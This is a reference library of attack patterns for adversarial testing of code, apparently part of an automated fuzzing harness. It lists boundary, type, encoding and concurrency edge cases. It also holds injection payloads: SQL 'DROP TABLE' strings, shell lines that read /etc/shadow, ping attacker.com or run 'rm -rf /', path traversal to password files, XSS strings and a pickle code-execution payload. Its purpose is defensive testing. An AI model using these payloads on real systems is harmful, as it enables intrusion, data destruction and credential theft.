# Attack Pattern Library

Comprehensive reference of attack patterns organized by category and language.
When attacking code, select patterns from the relevant categories based on
the attack surface analysis.

## Table of Contents

1. [Boundary Attacks](#1-boundary-attacks)
2. [Type Chaos](#2-type-chaos)
3. [Injection Attacks](#3-injection-attacks)
4. [Resource Exhaustion](#4-resource-exhaustion)
5. [State Corruption](#5-state-corruption)
6. [Encoding Attacks](#6-encoding-attacks)
7. [Logic Attacks](#7-logic-attacks)
8. [Error Path Attacks](#8-error-path-attacks)
9. [Language-Specific Patterns](#9-language-specific-patterns)

---

## 1. Boundary Attacks

Test values at the edges of expected ranges.

### Universal Boundary Values

| Target Type | Attack Values |
|-------------|--------------|
| Integers | 0, -1, 1, MAX_INT, MIN_INT, MAX_INT+1 |
| Floats | 0.0, -0.0, float('inf'), float('-inf'), float('nan'), sys.float_info.min, sys.float_info.max |
| Strings | "", " ", very long string (10^6 chars), single char |
| Arrays/Lists | [], [single], [10^6 elements], nested [[[]]] |
| Indices | -1, 0, len-1, len, len+1 |
| Dates | epoch (1970-01-01), far future (9999-12-31), Feb 29 on non-leap year, DST transition times |
| Files | 0 bytes, 1 byte, >2GB (32-bit boundary), >4GB (unsigned 32-bit) |

### Numeric Boundaries by Language

**Python:**
```python
import sys
attacks = [0, -1, 1, sys.maxsize, -sys.maxsize-1,
           float('inf'), float('-inf'), float('nan'),
           10**308, 10**-323, 1e-10,
           0.1 + 0.2]  # IEEE 754 gotcha
```

**JavaScript:**
```javascript
const attacks = [0, -0, NaN, Infinity, -Infinity,
                 Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER + 1,
                 Number.MIN_SAFE_INTEGER, Number.MIN_SAFE_INTEGER - 1,
                 Number.MAX_VALUE, Number.MIN_VALUE,
                 Number.EPSILON, 0.1 + 0.2];
```

**Go:**
```go
attacks := []int{0, -1, 1, math.MaxInt64, math.MinInt64}
floatAttacks := []float64{0, math.Inf(1), math.Inf(-1),
    math.NaN(), math.SmallestNonzeroFloat64, math.MaxFloat64}
```

### Off-by-One Patterns

Focus on loop bounds, array indexing, and range checks:

- `for i in range(n)` → test with n=0, n=1
- `array[i:j]` → test when i=j, i>j, j>len
- `if x > threshold` vs `if x >= threshold` — test at exact threshold
- Pagination: page=0, page=last, page=last+1

---

## 2. Type Chaos

Feed wrong types to see what happens.

### Python Type Attacks

```python
type_attacks = {
    'none': None,
    'bool_true': True,       # booleans are ints in Python!
    'bool_false': False,     # False == 0, True == 1
    'empty_string': '',
    'string_number': '42',
    'string_float': '3.14',
    'list_instead': [1, 2],
    'dict_instead': {'key': 'val'},
    'set_instead': {1, 2, 3},
    'bytes': b'hello',
    'tuple': (1, 2),
    'class_instance': object(),
    'generator': (x for x in range(3)),
    'nan': float('nan'),     # NaN != NaN, breaks equality
}
```

### JavaScript Type Attacks

```javascript
const typeAttacks = {
    undefined: undefined,
    null_val: null,
    nan: NaN,
    empty_obj: {},
    empty_arr: [],
    zero_str: '0',         // falsy string
    false_str: 'false',    // truthy!
    neg_zero: -0,          // -0 === 0 but 1/-0 === -Infinity
    symbol: Symbol('test'),
    bigint: 9007199254740993n,
    proxy: new Proxy({}, {}),
    date: new Date('invalid'),  // produces Invalid Date
    regex: /test/,
    func: () => {},
};
```

### Type Coercion Traps (JavaScript)

These produce surprising results — test if the code handles them:

```javascript
[] + []           // ""
[] + {}           // "[object Object]"
{} + []           // 0 (in some contexts)
true + true       // 2
'5' - 3           // 2
'5' + 3           // "53"
null == undefined  // true
null === undefined // false
NaN === NaN       // false
```

---

## 3. Injection Attacks

For code that processes external input and interacts with systems.

### SQL Injection

```python
sql_payloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM credentials--",
    "1; UPDATE users SET role='admin' WHERE id=1--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
    "'; WAITFOR DELAY '0:0:10'--",  # time-based blind
]
```

### Command Injection

```python
cmd_payloads = [
    "; ls -la /etc/passwd",
    "| cat /etc/shadow",
    "$(whoami)",
    "`id`",
    "& ping -c 3 attacker.com",
    "\n/bin/sh",
    "file.txt; rm -rf /",
    "../../../etc/passwd",
]
```

### Path Traversal

```python
path_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/dev/null",
    "/proc/self/environ",
    "file:///etc/passwd",
    "\x00.jpg",  # null byte injection
]
```

### XSS (for web-related code)

```python
xss_payloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
    "{{constructor.constructor('alert(1)')()}}",  # template injection
]
```

### Log Injection

```python
log_payloads = [
    "normal\nINFO: Admin login successful",  # log forging
    "user\r\nHTTP/1.1 200 OK\r\n",           # HTTP response splitting
    "\x1b[31mRED TEXT\x1b[0m",               # ANSI injection
]
```

---

## 4. Resource Exhaustion

Attempt to consume excessive memory, CPU, or time.

### Memory Bombs

```python
memory_attacks = {
    'huge_string': 'A' * (10**7),       # 10MB string
    'deep_nesting': None,               # see below
    'huge_list': list(range(10**7)),
    'huge_dict': {str(i): i for i in range(10**6)},
    'self_reference': None,             # see below
}

# Deep nesting
obj = {}
current = obj
for _ in range(10000):
    current['next'] = {}
    current = current['next']
memory_attacks['deep_nesting'] = obj

# Circular reference
a = {}
a['self'] = a
memory_attacks['self_reference'] = a
```

### CPU Bombs

```python
cpu_attacks = {
    'regex_redos': 'a' * 30 + '!',  # against pattern (a+)+$
    'huge_sort': list(range(10**6, 0, -1)),  # worst case sort
    'combinatorial': list(range(25)),  # if code does permutations
}
```

### Algorithmic Complexity Attacks

Target worst-case behavior of common algorithms:

- Hash table: keys designed to collide (same hash bucket)
- Sorting: already-sorted or reverse-sorted input for naive quicksort
- Regex: catastrophic backtracking with nested quantifiers
- JSON parsing: deeply nested `[[[[...]]]]`
- XML parsing: billion laughs attack pattern

---

## 5. State Corruption

Test mutable state under adversarial conditions.

### Reentrant Call Patterns

```python
# If function uses a shared cache/state, call it
# with inputs that cause it to call itself or modify
# shared state during execution

# Pattern: concurrent modification
shared_state = {}
def attack_concurrent():
    import threading
    errors = []
    def writer():
        for i in range(1000):
            shared_state[i] = i
    def reader():
        for i in range(1000):
            try:
                _ = list(shared_state.values())
            except RuntimeError as e:
                errors.append(e)
    t1 = threading.Thread(target=writer)
    t2 = threading.Thread(target=reader)
    t1.start(); t2.start()
    t1.join(); t2.join()
    return errors  # "dictionary changed size during iteration"
```

### State Leakage Between Calls

```python
# Call function multiple times and check if state leaks
result1 = target_function(input_a)
result2 = target_function(input_b)
result3 = target_function(input_a)
assert result1 == result3, "State leaked between calls!"
```

### Order-Dependent Behavior

```python
# Same inputs, different order — should produce same result?
result_abc = process([a, b, c])
result_cba = process([c, b, a])
# If function claims to be order-independent, these must match
```

---

## 6. Encoding Attacks

Exploit character encoding edge cases.

### Unicode Attack Vectors

```python
unicode_attacks = {
    'null_byte': 'hello\x00world',
    'zero_width_space': 'pass\u200bword',     # invisible char
    'rtl_override': '\u202eevil\u202c',       # right-to-left override
    'homoglyph': 'аdmin',                      # Cyrillic 'а' vs Latin 'a'
    'combining_chars': 'e\u0301',             # é as two chars
    'emoji': '💩🔥👨👩👧👦',                      # multi-byte emoji sequence
    'surrogate_pair': '\ud800',               # lone surrogate (invalid UTF-16)
    'bom': '\ufeff' + 'content',              # byte order mark
    'replacement_char': '\ufffd',
    'max_codepoint': '\U0010ffff',
    'normalization': ['é', 'é'],              # NFC vs NFD
    'fullwidth': 'ａｄｍｉｎ',                  # fullwidth Latin
    'superscript': 'aᵈᵐⁱⁿ',
}
```

### Encoding Mismatch

```python
# Feed UTF-8 encoded bytes where string is expected
b'\xc3\xa9'          # UTF-8 for é
b'\xe9'              # Latin-1 for é (invalid UTF-8)
b'\xff\xfe'          # UTF-16 LE BOM
'café'.encode('latin-1')  # may break if decoded as UTF-8
```

---

## 7. Logic Attacks

Target logical errors that produce wrong results without crashing.

### Comparison Traps

```python
# Floating point comparison
0.1 + 0.2 == 0.3      # False!
abs(0.1 + 0.2 - 0.3) < 1e-10  # proper way

# NaN comparison
float('nan') == float('nan')  # False
float('nan') != float('nan')  # True
x = float('nan')
x in [x]     # True in Python (identity check), False in some contexts
```

### Negation and Inversion

For every `if` condition, test the exact boundary where it flips:

```python
# If code does: if age >= 18
test_values = [17, 18, 19]  # tests both sides + boundary

# If code does: if len(items) > 0
test_values = [[], [1]]  # empty and single-element
```

### Time-of-Check vs Time-of-Use (TOCTOU)

```python
# If code checks a condition then acts on it:
# 1. Check: does file exist?
# 2. Act: read file
# Attack: delete file between check and act
import os, threading, time

def toctou_attack(filepath):
    def delete_between():
        time.sleep(0.001)  # tiny delay
        os.remove(filepath)
    threading.Thread(target=delete_between).start()
    if os.path.exists(filepath):
        time.sleep(0.01)  # simulate slow code
        return open(filepath).read()  # BOOM: FileNotFoundError
```

---

## 8. Error Path Attacks

Force errors in dependencies to test error handling.

### Mock Failure Patterns

```python
# Simulate external service failures
from unittest.mock import patch

# Network timeout
@patch('requests.get', side_effect=requests.Timeout)
def test_timeout(mock_get):
    result = target_function()  # does it handle gracefully?

# Disk full
@patch('builtins.open', side_effect=OSError(28, 'No space left on device'))
def test_disk_full(mock_open):
    result = target_function()

# Permission denied
@patch('builtins.open', side_effect=PermissionError)
def test_permission(mock_open):
    result = target_function()

# Database connection lost
@patch('db.query', side_effect=ConnectionError('Connection reset'))
def test_db_down(mock_db):
    result = target_function()
```

### Partial Failure

```python
# First call succeeds, second fails — test retry/recovery logic
call_count = 0
def flaky_service(*args):
    nonlocal call_count
    call_count += 1
    if call_count % 2 == 0:
        raise ConnectionError("intermittent failure")
    return "success"
```

---

## 9. Language-Specific Patterns

### Python-Specific

```python
# Mutable default argument
def broken(items=[]):
    items.append(1)
    return items
# broken() → [1], broken() → [1, 1], broken() → [1, 1, 1]

# __eq__ vs is
a = 256; b = 256; a is b  # True (cached small ints)
a = 257; b = 257; a is b  # False (not cached)

# Dictionary ordering (3.7+ guaranteed, but old habits)
# Pickle deserialization (arbitrary code execution)
import pickle
malicious = pickle.dumps(type('X', (), {'__reduce__': lambda self: (__import__('os').system, ('echo pwned',))}))

# Star unpacking edge cases
def f(*args): return sum(args)
f(*range(10**6))  # 1M positional args
```

### JavaScript-Specific

#### Prototype Pollution

The #1 JS-specific vulnerability. Occurs when user-controlled input can set
properties on `Object.prototype`, affecting all objects in the process.

```javascript
// Direct __proto__ pollution via object merge/assign
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
const target = {};
for (const key in payload) {
  target[key] = payload[key];  // sets target.__proto__.isAdmin = true
}
({}).isAdmin  // true — every new object is now "admin"

// Via constructor.prototype chain
deepMerge({}, { constructor: { prototype: { polluted: true } } });

// Via nested objects in JSON config
parseConfig('{"notifications": {"__proto__": {"role": "admin"}}}');

// Impact: privilege escalation, authentication bypass, RCE in some frameworks
// Detection: after merge/assign, check ({}).isAdmin, Object.prototype.role, etc.
// Fix: reject keys "__proto__", "constructor", "prototype" in merge functions
//   or use Object.create(null) as targets
// Cleanup: delete Object.prototype[key] after each test
```

#### Type Coercion Traps

```javascript
// These produce surprising results — test if the code handles them:
[] + []           // ""
[] + {}           // "[object Object]"
{} + []           // 0 (in some contexts)
true + true       // 2
'5' - 3           // 2
'5' + 3           // "53"
null == undefined  // true
null === undefined // false
NaN === NaN       // false

// Comparison pitfalls for validation code
null > 0    // false
null < 0    // false
null == 0   // false
null >= 0   // true!  (abstract relational comparison coerces null to 0)

// Array/object to primitive
[1] == 1        // true
['1'] == 1      // true
[null] == ''    // true
```

#### Promise & Async Error Handling

```javascript
// Unhandled rejection — silently drops errors
async function fetchData() {
  fetch('/api').then(r => r.json());  // no .catch, no await
}

// Rejection in Promise.all — first rejection cancels everything
await Promise.all([
  fetchSlow(),    // gets abandoned, not cancelled
  fetchFailing(), // throws — the other promise is orphaned
]);

// async void — errors vanish
element.onclick = async () => { throw new Error("oops"); };
// No way to catch this error externally
```

#### Array Hole Behavior

```javascript
const arr = [1, , 3];  // sparse array
arr.map(x => x * 2);   // [2, empty, 6]
arr.filter(x => true);  // [1, 3] — holes vanish!
arr.includes(undefined); // true — holes coerce to undefined in includes
arr.indexOf(undefined);  // -1 — but indexOf skips holes!
```

#### parseInt / Number Gotchas

```javascript
parseInt('08');         // 8 (was 0 in old engines, octal)
parseInt('Infinity');   // NaN
parseInt(0.0000001);   // 1 (toString → "1e-7" → parseInt → 1)
parseInt('0x10');       // 16 — silently parses hex
Number('');            // 0  — empty string is zero
Number(' ');           // 0  — whitespace-only is zero
Number(null);          // 0  — null coerces to 0
Number(undefined);     // NaN — but undefined is NaN
Number([1]);           // 1  — single-element array works
Number([1,2]);         // NaN — multi-element doesn't
```

#### Regex DoS (ReDoS)

```javascript
// Catastrophic backtracking patterns
const evil = 'a'.repeat(30) + '!';
/(a+)+$/.test(evil);        // hangs — exponential backtracking
/([a-z]+)+$/.test(evil);    // same pattern, different charset
/(a|a)+$/.test(evil);       // alternation with overlap

// Dynamic regex from user input — allows injection
new RegExp(userInput);       // if userInput = "(a+)+$", instant ReDoS
```

### Go-Specific

```go
// Nil interface vs nil pointer
var p *MyStruct = nil
var i interface{} = p
i == nil  // false! typed nil ≠ untyped nil

// Slice aliasing
a := []int{1, 2, 3, 4, 5}
b := a[1:3]  // b shares memory with a
b = append(b, 99)
// a is now [1, 2, 3, 99, 5] — surprise!

// Goroutine leak
func leaky() {
    ch := make(chan int)
    go func() {
        val := <-ch  // blocks forever if nobody sends
        fmt.Println(val)
    }()
    // goroutine leaked — GC can't collect it
}

// Range variable capture
funcs := make([]func(), 5)
for i := 0; i < 5; i++ {
    funcs[i] = func() { fmt.Println(i) }
}
// All print 5, not 0-4 (pre-Go 1.22)
```

### Rust-Specific

```rust
// Integer overflow (wraps silently in release mode!)
let x: u8 = 255;
let y = x + 1;  // debug: panic!, release: y = 0

// Deadlock with multiple mutexes
let a = Mutex::new(1);
let b = Mutex::new(2);
// Thread 1: lock(a) then lock(b)
// Thread 2: lock(b) then lock(a) → DEADLOCK

// Panic in Drop
impl Drop for Bomb {
    fn drop(&mut self) {
        panic!("boom");  // double-panic = abort
    }
}
```

---

## 10. Silent Failure Patterns

These are the hardest bugs to catch — the code runs without error, returns a
result, but the result is **wrong, dangerous, or nonsensical**. A dumb fuzzer
marks these as "passed". The semantic analysis layer (Step 3.5 in SKILL.md)
exists specifically to catch them.

### 10.1 NaN Propagation

NaN is a silent killer in numeric validation. Any comparison with NaN returns
False, so range checks pass silently:

```python
age = float('nan')
if age < 0 or age > 150:   # False or False → doesn't trigger!
    raise ValueError("bad age")
# NaN passes through and gets stored

# Detection: check return values for NaN/Inf with math.isnan()
# Fix: use `not (0 <= age <= 150)` — NaN makes this True
#   or explicitly: if math.isnan(age) or math.isinf(age): raise ...
```

Harness validator: `no_nan` — scans return values recursively for NaN/Inf.

### 10.2 Boolean-as-Integer Smuggling

In Python, `bool` is a subclass of `int`. `True == 1`, `False == 0`.
This means `isinstance(True, int)` is `True`, and `True` passes any
integer range check:

```python
age = True  # stored as 1
if isinstance(age, int) and 0 <= age <= 150:
    save(age)  # saves age=1, which is technically "valid"

# Detection: check if any numeric field contains a boolean
# Fix: check `isinstance(x, bool)` BEFORE `isinstance(x, int)`
```

Harness validator: `no_bool_as_int` — flags boolean values in return data.

### 10.3 Weak Validation Bypass

Code that checks for the *presence* of characters instead of *structure*:

```python
# Weak email check — passes "@.", "a@b", ".@"
if "@" in email and "." in email:
    accept(email)

# Weak URL check — passes "javascript:alert(1)//http://"
if "http" in url:
    accept(url)

# Weak phone check — passes "+++---"
if any(c.isdigit() for c in phone):
    accept(phone)
```

No harness validator — requires semantic understanding of what "valid" means
in context. This is where the LLM analysis layer adds value.

### 10.4 Stored XSS / Injection Persistence

The function doesn't execute the payload, but stores it for a downstream
consumer that will:

```python
def save_comment(user, text):
    db.insert({"user": user, "text": text})  # stores raw HTML
    return {"status": "ok"}
# Looks fine — no crash, returns success
# But text='<script>alert(1)</script>' is now in the DB
# When rendered in a web page: XSS

# Detection: scan stored/returned strings for HTML patterns
# Fix: sanitize before storage, not just before rendering
```

Harness validator: `no_html` — flags `<script>`, `<img`, `onerror=`, etc.

### 10.5 Invisible Character Contamination

Characters that are invisible but occupy space, alter rendering, or
change file paths:

```python
username = "al\u200bice"  # zero-width space between 'l' and 'i'
# Looks like "alice" everywhere
# But:
#   len(username) == 6, not 5
#   filename becomes "al\\u200bice.json" (different from "alice.json")
#   Two users can visually impersonate each other

# Detection: scan for Unicode categories Cf, Mn, Cc above ASCII range
# Fix: strip/reject invisible Unicode before processing
```

Harness validator: `no_invisible_unicode` — flags zero-width, bidi, etc.

### 10.6 Unrestricted Path Write

The function writes to a user-controlled path without validation:

```python
def save(data, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    # If output_dir="/etc/cron.d", attacker controls cron jobs
    # If output_dir="/root/.ssh", attacker can plant authorized_keys

# Detection: check if return value or side effects involve
#   paths outside expected directories
# Fix: validate output_dir against an allowlist or resolve and
#   check it's under an expected parent
```

Harness validator: `no_path_escape` — flags `..` and absolute paths in output.

### Using Validators in attack_config.json

Each attack can specify which validators to run on the return value:

```json
{
  "name": "NaN age",
  "category": "Type Chaos",
  "severity": "HIGH",
  "args": ["alice", "a@b.com", NaN],
  "validators": ["no_nan"]
}
```

Available validators: `no_nan`, `no_html`, `no_invisible_unicode`,
`no_path_escape`, `no_bool_as_int`.

The harness runs validators on any "survived" result. If a validator
fires, the verdict is upgraded to `wrong` (semantic error) or `leaked`
(security-relevant contamination).
